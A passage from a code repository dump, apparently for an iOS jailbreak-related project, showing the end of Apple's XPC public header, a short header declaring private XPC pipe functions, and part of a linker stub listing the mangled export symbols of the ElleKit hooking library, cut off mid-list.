 * The object for the specified key within the dictionary. NULL if there is no
 * value associated with the specified key, if the given object was not an
 * XPC dictionary, or if the object for the specified key is not a dictionary.
 *
 * @discussion
 * This method does not grant the caller a reference to the underlying object,
 * and thus the caller is not responsible for releasing the object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_11, __IPHONE_9_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL_ALL
xpc_object_t _Nullable
xpc_dictionary_get_dictionary(xpc_object_t xdict, const char *key);

/*!
 * @function xpc_dictionary_get_array
 *
 * @abstract
 * Returns the array value for the specified key.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @param key
 * The key whose value is to be obtained.
 * 
 * @result
 * The object for the specified key within the dictionary. NULL if there is no
 * value associated with the specified key, if the given object was not an
 * XPC dictionary, or if the object for the specified key is not an array.
 *
 * @discussion
 * This method does not grant the caller a reference to the underlying object,
 * and thus the caller is not responsible for releasing the object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_11, __IPHONE_9_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL_ALL
xpc_object_t _Nullable
xpc_dictionary_get_array(xpc_object_t xdict, const char *key);

#pragma mark Runtime
/*!
 * @function xpc_main
 * The springboard into the XPCService runtime. This function will set up your
 * service bundle's listener connection and manage it automatically. After this
 * initial setup, this function will, by default, call dispatch_main(). You may
 * override this behavior by setting the RunLoopType key in your XPC service
 * bundle's Info.plist under the XPCService dictionary.
 *
 * @param handler
 * The handler with which to accept new connections.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NORETURN XPC_NONNULL1
void
xpc_main(xpc_connection_handler_t handler);

#pragma mark Transactions
/*!
 * @function xpc_transaction_begin
 * Informs the XPC runtime that a transaction has begun and that the service
 * should not exit due to inactivity.
 * 
 * @discussion
 * A service with no outstanding transactions may automatically exit due to
 * inactivity as determined by the system.
 *
 * This function may be used to manually manage transactions in cases where
 * their automatic management (as described below) does not meet the needs of an
 * XPC service. This function also updates the transaction count used for sudden
 * termination, i.e. vproc_transaction_begin(), and these two interfaces may be
 * used in combination.
 *
 * The XPC runtime will automatically begin a transaction on behalf of a service
 * when a new message is received. If no reply message is expected, the
 * transaction is automatically ended when the last reference to the message is released.
 * If a reply message is created, the transaction will end when the reply
 * message is sent or released. An XPC service may use xpc_transaction_begin()
 * and xpc_transaction_end() to inform the XPC runtime about activity that
 * occurs outside of this common pattern.
 *
 * On macOS, when the XPC runtime has determined that the service should exit,
 * the event handlers for all active peer connections will receive
 * {@link XPC_ERROR_TERMINATION_IMMINENT} as an indication that they should
 * unwind their existing transactions. After this error is delivered to a
 * connection's event handler, no more messages will be delivered to the
 * connection.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_TRANSACTION_DEPRECATED
XPC_EXPORT
void
xpc_transaction_begin(void);

/*!
 * @function xpc_transaction_end
 * Informs the XPC runtime that a transaction has ended.
 * 
 * @discussion
 * As described in {@link xpc_transaction_begin()}, this API may be used
 * interchangeably with vproc_transaction_end().
 *
 * See the discussion for {@link xpc_transaction_begin()} for details regarding
 * the XPC runtime's idle-exit policy.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_TRANSACTION_DEPRECATED
XPC_EXPORT
void
xpc_transaction_end(void);

#pragma mark XPC Event Stream
/*!
 * @function xpc_set_event_stream_handler
 * Sets the event handler to invoke when streamed events are received.
 *
 * @param stream
 * The name of the event stream for which this handler will be invoked.
 *
 * @param targetq
 * The GCD queue to which the event handler block will be submitted. This
 * parameter may be NULL, in which case the connection's target queue will be
 * libdispatch's default target queue, defined as DISPATCH_TARGET_QUEUE_DEFAULT.
 * 
 * @param handler
 * The event handler block. The event which this block receives as its first
 * parameter will always be a dictionary which contains the XPC_EVENT_KEY_NAME
 * key. The value for this key will be a string whose value is the name assigned
 * to the XPC event specified in the launchd.plist. Future keys may be added to
 * this dictionary.
 *
 * @discussion
 * Multiple calls to this function for the same event stream will result in
 * undefined behavior.
 *
 * There is no API to pause delivery of XPC events. If a process that
 * has set an XPC event handler exits, events may be dropped due to races
 * between the event handler running and the process exiting.
 */
#if __BLOCKS__
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL3
void
xpc_set_event_stream_handler(const char *stream,
	dispatch_queue_t _Nullable targetq, xpc_handler_t handler);
#endif // __BLOCKS__ 

__END_DECLS
XPC_ASSUME_NONNULL_END

#endif // __XPC_H__ 

```

`BaseBin/_external/include/xpc_private.h`:

```h
#ifndef __XPC_PRIVATE_H__
#define __XPC_PRIVATE_H__

void xpc_dictionary_get_audit_token(xpc_object_t xdict, audit_token_t *token);
char *xpc_strerror (int);

extern XPC_RETURNS_RETAINED xpc_object_t xpc_pipe_create_from_port(mach_port_t port, uint32_t flags);
extern int xpc_pipe_simpleroutine(xpc_object_t pipe, xpc_object_t message);
extern int xpc_pipe_routine(xpc_object_t pipe, xpc_object_t message, XPC_GIVES_REFERENCE xpc_object_t *reply);
extern int xpc_pipe_routine_with_flags(xpc_object_t xpc_pipe, xpc_object_t inDict, XPC_GIVES_REFERENCE xpc_object_t *reply, uint32_t flags);
extern int xpc_pipe_routine_reply(xpc_object_t reply);
extern int xpc_pipe_receive(mach_port_t port, XPC_GIVES_REFERENCE xpc_object_t *message);

extern XPC_RETURNS_RETAINED xpc_object_t xpc_copy_entitlement_for_token(const char *, audit_token_t *);

#endif
```

`BaseBin/_external/lib/libellekit.tbd`:

```tbd
--- !tapi-tbd
tbd-version:           4
targets:               [ arm64-ios, arm64e-ios ]
flags:                 [ flat_namespace, not_app_extension_safe ]
install-name:          '@rpath/CydiaSubstrate.framework/CydiaSubstrate'
current-version:       1
compatibility-version: 1
exports:
  - targets:              [ arm64-ios, arm64e-ios ]
    symbols:              [ _$s7ellekit10LHStrErrorySVSgSo13LIBHOOKER_ERRVF,
                            _$s7ellekit10MSHookIvarySvSgyXlXp_SStF,
                            _$s7ellekit10findSymbol5image6symbolSVSgSV_SStKF,
                            _$s7ellekit11InstructionMp,
                            _$s7ellekit11InstructionTL,
                            _$s7ellekit11messageHookyyyXlXp_10ObjectiveC8SelectorVs13OpaquePointerVSpySvSgGSgtF,
                            _$s7ellekit12LHExecMemoryySiSpySvSgG_SvSitF,
                            _$s7ellekit12MSFindSymbolySVSgSV_SVtF,
                            _$s7ellekit12MSHookMemoryyySv_SPys5UInt8VGSgs6UInt64VtF,
                            _$s7ellekit13LBHookMessageyyyXlXp_10ObjectiveC8SelectorVs13OpaquePointerVSpySvSgGSgtF,
                            _$s7ellekit13LHPatchMemoryySiSPySo13LHMemoryPatchVG_SitF,
                            _$s7ellekit13hookClassPairyyyXlXp_yXlXpyXlXptF,
                            _$s7ellekit13hookFunctionsySbSaySv11destination_Sv11replacementSpySvSgGSg4origtG_SitKF,
                            _$s7ellekit13patchFunctionyySv_Says5UInt8VGyXEtF,
                            _$s7ellekit14MSHookFunctionyySv_SvSpySvSgGSgtF,
                            _$s7ellekit14getLinkedPaths4fileSaySSGSS_tKF,
                            _$s7ellekit14stopAllThreadsyyF,
                            _$s7ellekit15LHHookFunctionsySiSPySo14LHFunctionHookVG_SitF,
                            _$s7ellekit15MSHookClassPairyyyXlXp_yXlXpyXlXptF,
                            _$s7ellekit15MSHookMessageExyyyXlXp_10ObjectiveC8SelectorVs13OpaquePointerVSpySvSgGSgtF,
                            _$s7ellekit15loadSharedCacheyySSKF,
                            _$s7ellekit16ExceptionHandlerC13startPortLoopyyF,
                            _$s7ellekit16ExceptionHandlerC6threadSo17OS_dispatch_queueCvpfi,
                            _$s7ellekit16ExceptionHandlerCACycfC,
                            _$s7ellekit16ExceptionHandlerCACycfCTq,
                            _$s7ellekit16ExceptionHandlerCACycfc,
                            _$s7ellekit16ExceptionHandlerCMa,
                            _$s7ellekit16ExceptionHandlerCMm,
                            _$s7ellekit16ExceptionHandlerCMn,
                            _$s7ellekit16ExceptionHandlerCN,
                            _$s7ellekit16ExceptionHandlerCfD,
                            _$s7ellekit16ExceptionHandlerCfd,
                            _$s7ellekit16MSGetImageByNameySVSgSVF,
                            _$s7ellekit16exceptionHandlerAA09ExceptionC0CSgvau,
                            _$s7ellekit16exceptionHandlerAA09ExceptionC0CSgvp,
                            _$s7ellekit16resumeAllThreadsyyF,
                            _$s7ellekit18InstructionBuilderV10buildBlockySays5UInt8VGAA0B0_pd_tFZ,
                            _$s7ellekit18InstructionBuilderV11buildEither5firstAA0B0_pAaF_p_tFZ,
                            _$s7ellekit18InstructionBuilderV11buildEither6secondAA0B0_pAaF_p_tFZ,
                            _$s7ellekit18InstructionBuilderVMa,
                            _$s7ellekit18InstructionBuilderVMn,
                            _$s7ellekit18InstructionBuilderVN,
                            _$s7ellekit18getLinkedBundleIDs4fileSaySSGSS_tKF,
                            _$s7ellekit19enforceThreadSafetySbvau,
                            _$s7ellekit19enforceThreadSafetySbvp,
                            _$s7ellekit1bC5bytesSays5UInt8VGyF,
                            _$s7ellekit1bC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit1bC7encodedACSi_tcfC,
                            _$s7ellekit1bC7encodedACSi_tcfCTq,
                            _$s7ellekit1bC7encodedACSi_tcfc,
                            _$s7ellekit1bCAA11InstructionAAMc,
                            _$s7ellekit1bCAA11InstructionAAWP, _$s7ellekit1bCMa,
                            _$s7ellekit1bCMm, _$s7ellekit1bCMn, _$s7ellekit1bCN,
                            _$s7ellekit1bCfD, _$s7ellekit1bCfd,
                            _$s7ellekit1bCyACSicfC, _$s7ellekit1bCyACSicfCTq,
                            _$s7ellekit1bCyACSicfc,
                            _$s7ellekit20EKEnableThreadSafetyyySiF,
                            _$s7ellekit2blC5bytesSays5UInt8VGyF,
                            _$s7ellekit2blC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit2blC7encodedACSi_tcfC,
                            _$s7ellekit2blC7encodedACSi_tcfCTq,
                            _$s7ellekit2blC7encodedACSi_tcfc,
                            _$s7ellekit2blCAA11InstructionAAMc,
                            _$s7ellekit2blCAA11InstructionAAWP,
                            _$s7ellekit2blCMa, _$s7ellekit2blCMm,
                            _$s7ellekit2blCMn, _$s7ellekit2blCN, _$s7ellekit2blCfD,
                            _$s7ellekit2blCfd, _$s7ellekit2blCyACSicfC,
                            _$s7ellekit2blCyACSicfCTq, _$s7ellekit2blCyACSicfc,
                            _$s7ellekit2brC5bytesSays5UInt8VGyF,
                            _$s7ellekit2brC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit2brC7encodedACSi_tcfC,
                            _$s7ellekit2brC7encodedACSi_tcfCTq,
                            _$s7ellekit2brC7encodedACSi_tcfc,
                            _$s7ellekit2brCAA11InstructionAAMc,
                            _$s7ellekit2brCAA11InstructionAAWP,
                            _$s7ellekit2brCMa, _$s7ellekit2brCMm,
                            _$s7ellekit2brCMn, _$s7ellekit2brCN, _$s7ellekit2brCfD,
                            _$s7ellekit2brCfd, _$s7ellekit2brCyAcA8RegisterOcfC,
                            _$s7ellekit2brCyAcA8RegisterOcfCTq,
                            _$s7ellekit2brCyAcA8RegisterOcfc,
                            _$s7ellekit3addC5bytesSays5UInt8VGyF,
                            _$s7ellekit3addC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit3addC7encodedACSi_tcfC,
                            _$s7ellekit3addC7encodedACSi_tcfCTq,
                            _$s7ellekit3addC7encodedACSi_tcfc,
                            _$s7ellekit3addCAA11InstructionAAMc,
                            _$s7ellekit3addCAA11InstructionAAWP,
                            _$s7ellekit3addCMa, _$s7ellekit3addCMm,
                            _$s7ellekit3addCMn, _$s7ellekit3addCN,
                            _$s7ellekit3addCfD, _$s7ellekit3addCfd,
                            _$s7ellekit3addCyAcA8RegisterO_AESitcfC,
                            _$s7ellekit3addCyAcA8RegisterO_AESitcfCTq,
                            _$s7ellekit3addCyAcA8RegisterO_AESitcfc,
                            _$s7ellekit3asmyxSays5UInt8VGyXElF,
                            _$s7ellekit3asmyySays5UInt8VGyXEF,
                            _$s7ellekit3blrC5bytesSays5UInt8VGyF,
                            _$s7ellekit3blrC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit3blrC7encodedACSi_tcfC,
                            _$s7ellekit3blrC7encodedACSi_tcfCTq,
                            _$s7ellekit3blrC7encodedACSi_tcfc,
                            _$s7ellekit3blrCAA11InstructionAAMc,
                            _$s7ellekit3blrCAA11InstructionAAWP,
                            _$s7ellekit3blrCMa, _$s7ellekit3blrCMm,
                            _$s7ellekit3blrCMn, _$s7ellekit3blrCN,
                            _$s7ellekit3blrCfD, _$s7ellekit3blrCfd,
                            _$s7ellekit3blrCyAcA8RegisterOcfC,
                            _$s7ellekit3blrCyAcA8RegisterOcfCTq,
                            _$s7ellekit3blrCyAcA8RegisterOcfc,
                            _$s7ellekit3ldrC5bytesSays5UInt8VGyF,
                            _$s7ellekit3ldrC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit3ldrC7encodedACSi_tcfC,
                            _$s7ellekit3ldrC7encodedACSi_tcfCTq,
                            _$s7ellekit3ldrC7encodedACSi_tcfc,
                            _$s7ellekit3ldrCAA11InstructionAAMc,
                            _$s7ellekit3ldrCAA11InstructionAAWP,
                            _$s7ellekit3ldrCMa, _$s7ellekit3ldrCMm,
                            _$s7ellekit3ldrCMn, _$s7ellekit3ldrCN,
                            _$s7ellekit3ldrCfD, _$s7ellekit3ldrCfd,
                            _$s7ellekit3ldrCyAcA8RegisterO_AESitcfC,
                            _$s7ellekit3ldrCyAcA8RegisterO_AESitcfCTq,
                            _$s7ellekit3ldrCyAcA8RegisterO_AESitcfc,
                            _$s7ellekit3nopC5bytesSays5UInt8VGyF,
                            _$s7ellekit3nopC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit3nopC5valueSivpfi,
                            _$s7ellekit3nopC7encodedACSi_tcfC,
                            _$s7ellekit3nopC7encodedACSi_tcfCTq,
                            _$s7ellekit3nopC7encodedACSi_tcfc,
                            _$s7ellekit3nopCAA11InstructionAAMc,
                            _$s7ellekit3nopCAA11InstructionAAWP,
                            _$s7ellekit3nopCACycfC, _$s7ellekit3nopCACycfCTq,
                            _$s7ellekit3nopCACycfc, _$s7ellekit3nopCMa,
                            _$s7ellekit3nopCMm, _$s7ellekit3nopCMn,
                            _$s7ellekit3nopCN, _$s7ellekit3nopCfD,
                            _$s7ellekit3nopCfd,
                            _$s7ellekit3retC5bytesSays5UInt8VGyF,
                            _$s7ellekit3retC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit3retC7encodedACSi_tcfC,
                            _$s7ellekit3retC7encodedACSi_tcfCTq,
                            _$s7ellekit3retC7encodedACSi_tcfc,
                            _$s7ellekit3retCAA11InstructionAAMc,
                            _$s7ellekit3retCAA11InstructionAAWP,
                            _$s7ellekit3retCABSays5UInt8VGvpfi,
                            _$s7ellekit3retCACycfC, _$s7ellekit3retCACycfCTq,
                            _$s7ellekit3retCACycfc, _$s7ellekit3retCMa,
                            _$s7ellekit3retCMm, _$s7ellekit3retCMn,
                            _$s7ellekit3retCN, _$s7ellekit3retCfD,
                            _$s7ellekit3retCfd,
                            _$s7ellekit3strC5bytesSays5UInt8VGyF,
                            _$s7ellekit3strC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit3strC7encodedACSi_tcfC,
                            _$s7ellekit3strC7encodedACSi_tcfCTq,
                            _$s7ellekit3strC7encodedACSi_tcfc,
                            _$s7ellekit3strCAA11InstructionAAMc,
                            _$s7ellekit3strCAA11InstructionAAWP,
                            _$s7ellekit3strCMa, _$s7ellekit3strCMm,
                            _$s7ellekit3strCMn, _$s7ellekit3strCN,
                            _$s7ellekit3strCfD, _$s7ellekit3strCfd,
                            _$s7ellekit3strCyAcA8RegisterO_AESitcfC,
                            _$s7ellekit3strCyAcA8RegisterO_AESitcfCTq,
                            _$s7ellekit3strCyAcA8RegisterO_AESitcfc,
                            _$s7ellekit3subC5bytesSays5UInt8VGyF,
                            _$s7ellekit3subC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit3subC7encodedACSi_tcfC,
                            _$s7ellekit3subC7encodedACSi_tcfCTq,
                            _$s7ellekit3subC7encodedACSi_tcfc,
                            _$s7ellekit3subCAA11InstructionAAMc,
                            _$s7ellekit3subCAA11InstructionAAWP,
                            _$s7ellekit3subCMa, _$s7ellekit3subCMm,
                            _$s7ellekit3subCMn, _$s7ellekit3subCN,
                            _$s7ellekit3subCfD, _$s7ellekit3subCfd,
                            _$s7ellekit3subCyAcA8RegisterO_AESitcfC,
                            _$s7ellekit3subCyAcA8RegisterO_AESitcfCTq,
                            _$s7ellekit3subCyAcA8RegisterO_AESitcfc,
                            _$s7ellekit3svcC5bytesSays5UInt8VGyF,
                            _$s7ellekit3svcC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit3svcC7encodedACSi_tcfC,
                            _$s7ellekit3svcC7encodedACSi_tcfCTq,
                            _$s7ellekit3svcC7encodedACSi_tcfc,
                            _$s7ellekit3svcCAA11InstructionAAMc,
                            _$s7ellekit3svcCAA11InstructionAAWP,
                            _$s7ellekit3svcCMa, _$s7ellekit3svcCMm,
                            _$s7ellekit3svcCMn, _$s7ellekit3svcCN,
                            _$s7ellekit3svcCfD, _$s7ellekit3svcCfd,
                            _$s7ellekit3svcCyACSicfC, _$s7ellekit3svcCyACSicfCTq,
                            _$s7ellekit3svcCyACSicfc, _$s7ellekit4CondV2ALACvau,
                            _$s7ellekit4CondV2ALACvgZ, _$s7ellekit4CondV2ALACvpZ,
                            _$s7ellekit4CondV2CCACvau, _$s7ellekit4CondV2CCACvgZ,
                            _$s7ellekit4CondV2CCACvpZ, _$s7ellekit4CondV2CSACvau,
                            _$s7ellekit4CondV2CSACvgZ, _$s7ellekit4CondV2CSACvpZ,
                            _$s7ellekit4CondV2EQACvau, _$s7ellekit4CondV2EQACvgZ,
                            _$s7ellekit4CondV2EQACvpZ, _$s7ellekit4CondV2GEACvau,
                            _$s7ellekit4CondV2GEACvgZ, _$s7ellekit4CondV2GEACvpZ,
                            _$s7ellekit4CondV2GTACvau, _$s7ellekit4CondV2GTACvgZ,
                            _$s7ellekit4CondV2GTACvpZ, _$s7ellekit4CondV2HIACvau,
                            _$s7ellekit4CondV2HIACvgZ, _$s7ellekit4CondV2HIACvpZ,
                            _$s7ellekit4CondV2HSACvau, _$s7ellekit4CondV2HSACvgZ,
                            _$s7ellekit4CondV2HSACvpZ, _$s7ellekit4CondV2LEACvau,
                            _$s7ellekit4CondV2LEACvgZ, _$s7ellekit4CondV2LEACvpZ,
                            _$s7ellekit4CondV2LOACvau, _$s7ellekit4CondV2LOACvgZ,
                            _$s7ellekit4CondV2LOACvpZ, _$s7ellekit4CondV2LSACvau,
                            _$s7ellekit4CondV2LSACvgZ, _$s7ellekit4CondV2LSACvpZ,
                            _$s7ellekit4CondV2LTACvau, _$s7ellekit4CondV2LTACvgZ,
                            _$s7ellekit4CondV2LTACvpZ, _$s7ellekit4CondV2MIACvau,
                            _$s7ellekit4CondV2MIACvgZ, _$s7ellekit4CondV2MIACvpZ,
                            _$s7ellekit4CondV2NEACvau, _$s7ellekit4CondV2NEACvgZ,
                            _$s7ellekit4CondV2NEACvpZ, _$s7ellekit4CondV2PLACvau,
                            _$s7ellekit4CondV2PLACvgZ, _$s7ellekit4CondV2PLACvpZ,
                            _$s7ellekit4CondV2VCACvau, _$s7ellekit4CondV2VCACvgZ,
                            _$s7ellekit4CondV2VCACvpZ, _$s7ellekit4CondV2VSACvau,
                            _$s7ellekit4CondV2VSACvgZ, _$s7ellekit4CondV2VSACvpZ,
                            _$s7ellekit4CondV3NVbACvau,
                            _$s7ellekit4CondV3NVbACvgZ,
                            _$s7ellekit4CondV3NVbACvpZ, _$s7ellekit4CondVMa,
                            _$s7ellekit4CondVMn, _$s7ellekit4CondVN,
                            _$s7ellekit4cselC5bytesSays5UInt8VGyF,
                            _$s7ellekit4cselC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit4cselC7encodedACSi_tcfC,
                            _$s7ellekit4cselC7encodedACSi_tcfCTq,
                            _$s7ellekit4cselC7encodedACSi_tcfc,
                            _$s7ellekit4cselCAA11InstructionAAMc,
                            _$s7ellekit4cselCAA11InstructionAAWP,
                            _$s7ellekit4cselCMa, _$s7ellekit4cselCMm,
                            _$s7ellekit4cselCMn, _$s7ellekit4cselCN,
                            _$s7ellekit4cselCfD, _$s7ellekit4cselCfd,
                            _$s7ellekit4cselCyAcA8RegisterO_A2eA4CondVtcfC,
                            _$s7ellekit4cselCyAcA8RegisterO_A2eA4CondVtcfCTq,
                            _$s7ellekit4cselCyAcA8RegisterO_A2eA4CondVtcfc,
                            _$s7ellekit4hook__2inSvSgSv_SvSStF,
                            _$s7ellekit4hookySvSgSv_SvtF,
                            _$s7ellekit4hookyySv_SvtF,
                            _$s7ellekit4movkC5bytesSays5UInt8VGyF,
                            _$s7ellekit4movkC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit4movkC7encodedACSi_tcfC,
                            _$s7ellekit4movkC7encodedACSi_tcfCTq,
                            _$s7ellekit4movkC7encodedACSi_tcfc,
                            _$s7ellekit4movkCAA11InstructionAAMc,
                            _$s7ellekit4movkCAA11InstructionAAWP,
                            _$s7ellekit4movkCMa, _$s7ellekit4movkCMm,
                            _$s7ellekit4movkCMn, _$s7ellekit4movkCN,
                            _$s7ellekit4movkC__3lslAcA8RegisterO_S2itcfC,
                            _$s7ellekit4movkC__3lslAcA8RegisterO_S2itcfCTq,
                            _$s7ellekit4movkC__3lslAcA8RegisterO_S2itcfc,
                            _$s7ellekit4movkC__3lslAcA8RegisterO_s6UInt64VSitcfC,
                            _$s7ellekit4movkC__3lslAcA8RegisterO_s6UInt64VSitcfCTq,
                            _$s7ellekit4movkC__3lslAcA8RegisterO_s6UInt64VSitcfc,
                            _$s7ellekit4movkCfD, _$s7ellekit4movkCfd,
                            _$s7ellekit4movzC5bytesSays5UInt8VGyF,
                            _$s7ellekit4movzC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit4movzC7encodedACSi_tcfC,
                            _$s7ellekit4movzC7encodedACSi_tcfCTq,
                            _$s7ellekit4movzC7encodedACSi_tcfc,
                            _$s7ellekit4movzCAA11InstructionAAMc,
                            _$s7ellekit4movzCAA11InstructionAAWP,
                            _$s7ellekit4movzCMa, _$s7ellekit4movzCMm,
                            _$s7ellekit4movzCMn, _$s7ellekit4movzCN,
                            _$s7ellekit4movzCfD, _$s7ellekit4movzCfd,
                            _$s7ellekit4movzCyAcA8RegisterO_SitcfC,
                            _$s7ellekit4movzCyAcA8RegisterO_SitcfCTq,
                            _$s7ellekit4movzCyAcA8RegisterO_Sitcfc,
                            _$s7ellekit5bytesC10byteValuesSays5UInt8VGvg,
                            _$s7ellekit5bytesC10byteValuesSays5UInt8VGvpMV,
                            _$s7ellekit5bytesC10byteValuesSays5UInt8VGvpWvd,
                            _$s7ellekit5bytesC7encodedACSi_tcfC,
                            _$s7ellekit5bytesC7encodedACSi_tcfCTq,
                            _$s7ellekit5bytesC7encodedACSi_tcfc,
                            _$s7ellekit5bytesCAA11InstructionAAMc,
                            _$s7ellekit5bytesCAA11InstructionAAWP,
                            _$s7ellekit5bytesCABSays5UInt8VGyF,
                            _$s7ellekit5bytesCABSays5UInt8VGyFTq,
                            _$s7ellekit5bytesCMa, _$s7ellekit5bytesCMm,
                            _$s7ellekit5bytesCMn, _$s7ellekit5bytesCN,
                            _$s7ellekit5bytesCfD, _$s7ellekit5bytesCfd,
                            _$s7ellekit5bytesCyACSays5UInt8VGcfC,
                            _$s7ellekit5bytesCyACSays5UInt8VGcfCTq,
                            _$s7ellekit5bytesCyACSays5UInt8VGcfc,
                            _$s7ellekit5bytesCyACs5UInt8Vd_tcfC,
                            _$s7ellekit5bytesCyACs5UInt8Vd_tcfCTq,
                            _$s7ellekit5bytesCyACs5UInt8Vd_tcfc,
                            _$s7ellekit5hooksSDyS2vGvau,
                            _$s7ellekit5hooksSDyS2vGvp,
                            _$s7ellekit5paciaC5bytesSays5UInt8VGyF,
                            _$s7ellekit5paciaC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit5paciaC7encodedACSi_tcfC,
                            _$s7ellekit5paciaC7encodedACSi_tcfCTq,
                            _$s7ellekit5paciaC7encodedACSi_tcfc,
                            _$s7ellekit5paciaCAA11InstructionAAMc,
                            _$s7ellekit5paciaCAA11InstructionAAWP,
                            _$s7ellekit5paciaCMa, _$s7ellekit5paciaCMm,
                            _$s7ellekit5paciaCMn, _$s7ellekit5paciaCN,
                            _$s7ellekit5paciaCfD, _$s7ellekit5paciaCfd,
                            _$s7ellekit5paciaCyAcA8RegisterO_AEtcfC,
                            _$s7ellekit5paciaCyAcA8RegisterO_AEtcfCTq,
                            _$s7ellekit5paciaCyAcA8RegisterO_AEtcfc,
                            _$s7ellekit5print_4file4lineyyp_SSSitF,
                            _$s7ellekit5print_4file_4line9separatoryypd_SSypdSiSStF,
                            _$s7ellekit5slide3forSiSgSS_tF,
                            _$s7ellekit6dprint_4file_4line9separatoryypd_SSypdSiSStF,
                            _$s7ellekit6pacizaC5bytesSays5UInt8VGyF,
                            _$s7ellekit6pacizaC5bytesSays5UInt8VGyFTq,
                            _$s7ellekit6pacizaC7encodedACSi_tcfC,
                            _$s7ellekit6pacizaC7encodedACSi_tcfCTq,
                            _$s7ellekit6pacizaC7encodedACSi_tcfc,
                            _$s7ellekit6pacizaCAA11InstructionAAMc,
                            _$s7ellekit6pacizaCAA11InstructionAAWP,
                            _$s7ellekit6pacizaCMa, _$s7ellekit6pacizaCMm,
                            _$s7ellekit6pacizaCMn, _$s7ellekit6pacizaCN,
                            _$s7ellekit6pacizaCfD, _$s7ellekit6pacizaCfd,
                            _$s7ellekit6pacizaCyAcA8RegisterOcfC,
                            _$s7ellekit6pacizaCyAcA8RegisterOcfCTq,
                            _$s7ellekit6pacizaCyAcA8RegisterOcfc,
                            _$s7ellekit6tprint_4file_4line9separatoryypd_SSypdSiSStF,
                            _$s7ellekit8RegisterO2w0ACvau,
                            _$s7ellekit8RegisterO2w0ACvgZ,
                            _$s7ellekit8RegisterO2w0ACvpZ,
                            _$s7ellekit8RegisterO2w1ACvau,
                            _$s7ellekit8RegisterO2w1ACvgZ,
                            _$s7ellekit8RegisterO2w1ACvpZ,
                            _$s7ellekit8RegisterO2w2ACvau,
                            _$s7ellekit8RegisterO2w2ACvgZ,
                            _$s7ellekit8RegisterO2w2ACvpZ,
                            _$s7ellekit8RegisterO2w3ACvau,
                            _$s7ellekit8RegisterO2w3ACvgZ,
                            _$s7ellekit8RegisterO2w3ACvpZ,
                            _$s7ellekit8RegisterO2w4ACvau,
                            _$s7ellekit8RegisterO2w4ACvgZ,
                            _$s7ellekit8RegisterO2w4ACvpZ,
                            _$s7ellekit8RegisterO2w5ACvau,
                            _$s7ellekit8RegisterO2w5ACvgZ,
                            _$s7ellekit8RegisterO2w5ACvpZ,
                            _$s7ellekit8RegisterO2w6ACvau,
                            _$s7ellekit8RegisterO2w6ACvgZ,
                            _$s7ellekit8RegisterO2w6ACvpZ,
                            _$s7ellekit8RegisterO2w7ACvau,
                            _$s7ellekit8RegisterO2w7ACvgZ,
                            _$s7ellekit8RegisterO2w7ACvpZ,
                            _$s7ellekit8RegisterO2w8ACvau,
                            _$s7ellekit8RegisterO2w8ACvgZ,
                            _$s7ellekit8RegisterO2w8ACvpZ,
                            _$s7ellekit8RegisterO2w9ACvau,
                            _$s7ellekit8RegisterO2w9ACvgZ,
                            _$s7ellekit8RegisterO2w9ACvpZ,
                            _$s7ellekit8RegisterO2x0ACvau,
                            _$s7ellekit8RegisterO2x0ACvgZ,
                            _$s7ellekit8RegisterO2x0ACvpZ,
                            _$s7ellekit8RegisterO2x1ACvau,
                            _$s7ellekit8RegisterO2x1ACvgZ,
                            _$s7ellekit8RegisterO2x1ACvpZ,
                            _$s7ellekit8RegisterO2x2ACvau,
                            _$s7ellekit8RegisterO2x2ACvgZ,
                            _$s7ellekit8RegisterO2x2ACvpZ,
                            _$s7ellekit8RegisterO2x3ACvau,
                            _$s7ellekit8RegisterO2x3ACvgZ,
                            _$s7ellekit8RegisterO2x3ACvpZ,
                            _$s7ellekit8RegisterO2x4ACvau,
                            _$s7ellekit8RegisterO2x4ACvgZ,
                            _$s7ellekit8RegisterO2x4ACvpZ,
                            _$s7ellekit8RegisterO2x5ACvau,
                            _$s7ellekit8RegisterO2x5ACvgZ,
                            _$s7ellekit8RegisterO2x5ACvpZ,
                            _$s7ellekit8RegisterO2x6ACvau,
                            _$s7ellekit8RegisterO2x6ACvgZ,
                            _$s7ellekit8RegisterO2x6ACvpZ,
                            _$s7ellekit8RegisterO2x7ACvau,
                            _$s7ellekit8RegisterO2x7ACvgZ,
                            _$s7ellekit8RegisterO2x7ACvpZ,
                            _$s7ellekit8RegisterO2x8ACvau,
                            _$s7ellekit8RegisterO2x8ACvgZ,
                            _$s7ellekit8RegisterO2x8ACvpZ,
                            _$s7ellekit8RegisterO2x9ACvau,
                            _$s7ellekit8RegisterO2x9ACvgZ,
                            _$s7ellekit8RegisterO2x9ACvpZ,
                            _$s7ellekit8RegisterO3w10ACvau,
                            _$s7ellekit8RegisterO3w10ACvgZ,
                            _$s7ellekit8RegisterO3w10ACvpZ,
                            _$s7ellekit8RegisterO3w11ACvau,
                            _$s7ellekit8RegisterO3w11ACvgZ,
                            _$s7ellekit8RegisterO3w11ACvpZ,
                            _$s7ellekit8RegisterO3w12ACvau,
                            _$s7ellekit8RegisterO3w12ACvgZ,
                            _$s7ellekit8RegisterO3w12ACvpZ,
                            _$s7ellekit8RegisterO3w13ACvau,
